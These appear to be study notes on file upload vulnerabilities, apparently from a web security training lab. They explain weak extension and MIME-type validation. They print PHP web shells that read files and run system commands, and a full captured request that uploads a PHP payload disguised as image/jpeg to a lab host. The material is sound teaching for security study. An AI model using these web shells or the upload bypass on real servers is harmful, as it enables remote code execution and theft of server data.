# What are file upload vulnerabilities?
File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

In some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.

## How do file upload vulnerabilities arise?
Given the fairly obvious dangers, it's rare for websites in the wild to have no restrictions whatsoever on which files users are allowed to upload. More commonly, developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed.

For example, they may attempt to blacklist dangerous file types, but fail to account for parsing discrepancies when checking the file extensions. As with any blacklist, it's also easy to accidentally omit more obscure file types that may still be dangerous.

In other cases, the website may attempt to check the file type by verifying properties that can be easily manipulated by an attacker using tools like Burp Proxy or Repeater.

Ultimately, even robust validation measures may be applied inconsistently across the network of hosts and directories that form the website, resulting in discrepancies that can be exploited.

## Exploiting unrestricted file uploads to deploy a web shell
From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.

Web shell
A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.

If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:
```
<?php echo system($_GET['command']); ?>
```
This script enables you to pass an arbitrary system command via a query parameter as follows:

GET /example/exploit.php?command=id HTTP/1.1

### Challenge
Upload a php webshell and exfiltrate the contents of /home/carlos/secret
In Blog, log into your wiener:peter account and upload payload to your avatar. 

# Exploiting flawed validation of file uploads
In the wild, it's unlikely that you'll find a website that has no protection against file upload attacks like we saw in the previous lab. But just because defenses are in place, that doesn't mean that they're robust. You can sometimes still exploit flaws in these mechanisms to obtain a web shell for remote code execution.

## Flawed file type validation
When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type application/x-www-form-url-encoded. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type multipart/form-data is preferred.

Flawed file type validation - Continued
Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:

POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
As you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a Content-Disposition header, which provides some basic information about the input field it relates to. These individual parts may also contain their own Content-Type header, which tells the server the MIME type of the data that was submitted using this input.

One way that websites may attempt to validate file uploads is to check that this input-specific Content-Type header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like image/jpeg and image/png. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater.

## Challenge
In Blog, upload a file to get RCE again but you'll have to change the mime type:

```
POST /my-account/avatar HTTP/2
Host: 0ac5004703d8606181db20bc00b6001e.web-security-academy.net
Cookie: session=k5ApY5KEeOVUFXL6fkM2KHkqqU5DmdY2
Content-Length: 464
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0ac5004703d8606181db20bc00b6001e.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynaP4Lq6dAjESF1y6
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac5004703d8606181db20bc00b6001e.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundarynaP4Lq6dAjESF1y6
Content-Disposition: form-data; name="avatar"; filename="readfile.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundarynaP4Lq6dAjESF1y6
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarynaP4Lq6dAjESF1y6
Content-Disposition: form-data; name="csrf"

DLbAq8F54yOIPzPbtQnVePQZQnpL8JfV
------WebKitFormBoundarynaP4Lq6dAjESF1y6--
```

